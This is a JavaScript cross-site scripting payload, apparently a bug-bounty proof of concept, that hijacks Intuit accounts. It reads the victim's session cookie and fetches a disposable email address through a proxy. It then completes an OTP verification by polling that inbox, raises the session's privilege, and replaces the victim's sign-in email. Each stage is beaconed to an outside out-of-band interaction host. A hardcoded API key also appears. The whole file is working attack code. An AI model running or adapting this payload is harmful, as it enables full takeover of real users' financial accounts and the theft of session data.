(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var G='https://api.guerrillamail.com/ajax.php';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function wp(url){
return fetch(W+encodeURIComponent(url)).then(function(r){
if(!r.ok)throw new Error('proxy '+r.status);
return r.text()
})
}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}

var session=gc('ius_session');
var visitorId=gc('ivid');

var hdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'Intuit_Interception':'ignore-response',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_offeringenv':'prd',
'intuit_identity_routing':'SBSEG',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_locale':'en-us',
'intuit_country':'US',
'intuit_samesite_support':'true',
'intuit_authn_session_slot':'qbn',
'intuit_origin':'https://accounts.intuit.com',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

log('[*] XSS Sign-In Email Change PoC');
log('[*] Origin: '+location.origin);
log('[*] Session: '+session.substring(0,20)+'...');
log('');

log('[0] Getting temp email...');
wp(G+'?f=get_email_address')
.then(function(raw){
var data=JSON.parse(raw);
var email=data.email_addr;
var sid=data.sid_token;
log('[0] Temp email: '+email);
beacon('p35-email',email);

log('[1] Initialize verifier...');
return fetch('/factors/v1/verifier/initialize/email',{
method:'POST',headers:hdrs,credentials:'include',
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email})
}).then(function(r){return r.json()}).then(function(d){
if(!d.verifierSessionId)throw new Error('no vsid: '+JSON.stringify(d).substring(0,200));
var vsid=d.verifierSessionId;
log('[1] vsid: '+vsid.substring(0,30)+'...');

log('[2] Polling for OTP...');
var attempt=0;
function poll(){
attempt++;
return wp(G+'?f=check_email&seq=0&sid_token='+encodeURIComponent(sid))
.then(function(raw2){
var resp=JSON.parse(raw2);
var list=resp.list||[];
if(attempt%5===1) log('[2] Poll #'+attempt+': '+list.length+' emails');
if(list.length>0){
var found=null;
for(var i=0;i<list.length;i++){
var subj=(list[i].mail_subject||'').toLowerCase();
if(subj.indexOf('welcome to guerrilla')!==-1)continue;
found=list[i];break
}
if(found){
log('[2] Got email: '+found.mail_subject);
return wp(G+'?f=fetch_email&email_id='+found.mail_id+'&sid_token='+encodeURIComponent(sid))
.then(function(r2){return JSON.parse(r2)})
}
}
if(attempt>=60)throw new Error('OTP timeout');
return new Promise(function(res){setTimeout(function(){res(poll())},3000)})
})
}

return poll().then(function(msg){
var body=(msg.mail_body||'').replace(/<[^>]*>/g,' ');
var m=body.match(/\b(\d{6})\b/);
var otp=m?m[1]:null;
if(!otp)throw new Error('no OTP in email');
log('[2] OTP: '+otp);

log('[3] Verifying OTP...');
return fetch('/factors/v1/verifier/verify/email',{
method:'POST',headers:hdrs,credentials:'include',
body:JSON.stringify({verifierSessionId:vsid,otp:otp})
}).then(function(r){return r.json()}).then(function(vd){
if(!vd.verifierToken)throw new Error('no verifierToken');
var vt=vd.verifierToken;
log('[3] Got verifierToken');

log('[4] SignIn (elevate session)...');
var signInHdrs={};
for(var k in hdrs)signInHdrs[k]=hdrs[k];
signInHdrs['intuit_baggage']=btoa(JSON.stringify({scope_area:'remediation'}));

return fetch('/identity-api/signin/graphql',{
method:'POST',headers:signInHdrs,credentials:'include',
body:JSON.stringify({
query:'mutation SignInWithVerifierToken($input:Identity_BrowserSignInWithVerifierTokenInput!){identityBrowserSignInWithVerifierToken(input:$input){__typename ...on Identity_BrowserSignInWithVerifierTokenNothingElseRequired{__typename successCode authenticationSession{digitalIdentity{legacyAuthId pseudonymId}}}...on Identity_BrowserSignInWithVerifierTokenAccessDenied{__typename}...on Identity_BrowserSignInWithVerifierTokenSomethingElseRequired{__typename}...on Identity_SignInError{__typename}}}',
variables:{input:{
intent:{appGroup:'',assetAlias:'Intuit.identity.experiences.oneintuitam',securityCategory:'ORANGE',redirectUri:'https://accounts.intuit.com/app/account-manager/security/email',rememberMe:false},
clientCapabilitySet:'v13',finalSlotNames:['qbn'],
deviceCapabilities:{passkeySupported:false,simTs43Supported:false,digitalCredential:{userAgentAllowsProtocols:[]}},
inputSlotName:'qbn',tenantIds:['50000003'],verifierToken:vt
}}
})
}).then(function(r){return r.text()}).then(function(sr){
var srd;try{srd=JSON.parse(sr)}catch(e){}
var authId='';
if(srd&&srd.data){
var res=srd.data.identityBrowserSignInWithVerifierToken;
if(res&&res.authenticationSession&&res.authenticationSession.digitalIdentity){
authId=res.authenticationSession.digitalIdentity.legacyAuthId||'';
}
}
if(!authId)throw new Error('no authId from SignIn');
log('[4] authId: '+authId);
log('[4] Session elevated to ORANGE');

log('[5] Replacing sign-in email credential...');
return fetch('/identity-api/signin/graphql',{
method:'POST',headers:signInHdrs,credentials:'include',
body:JSON.stringify({
query:'mutation ReplaceEmail($input:Identity_CreateOrReplaceEmailCredentialInput!){identityCreateOrReplaceEmailCredential(input:$input){__typename ...on Identity_CreateOrReplaceEmailCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}',
variables:{input:{newEmailAddress:email}}
})
}).then(function(r){return r.text()}).then(function(cr){
log('[5] Response: '+cr.substring(0,500));
beacon('p35-replace-a',cr.substring(0,900));
beacon('p35-replace-b',cr.substring(900,1800));

var crd;try{crd=JSON.parse(cr)}catch(e){}
if(crd&&crd.data&&crd.data.identityCreateOrReplaceEmailCredential){
var result=crd.data.identityCreateOrReplaceEmailCredential;
if(result.__typename==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('========================================');
log('  SIGN-IN EMAIL REPLACED TO:');
log('  '+email);
log('========================================');
beacon('p35-SUCCESS','email='+email);
}else{
log('[!] Failed: '+result.__typename+' - '+(result.message||''));
beacon('p35-fail',result.__typename+':'+(result.message||''));
}
}else if(crd&&crd.errors){
log('[!] GraphQL errors: '+JSON.stringify(crd.errors).substring(0,400));
beacon('p35-gql-err',JSON.stringify(crd.errors).substring(0,900));
}else{
log('[!] Unexpected response');
beacon('p35-unexpected',cr.substring(0,400));
}
})
})
})
})
})
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p35-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p35-crash?e='+encodeURIComponent(e.message);
}
})();
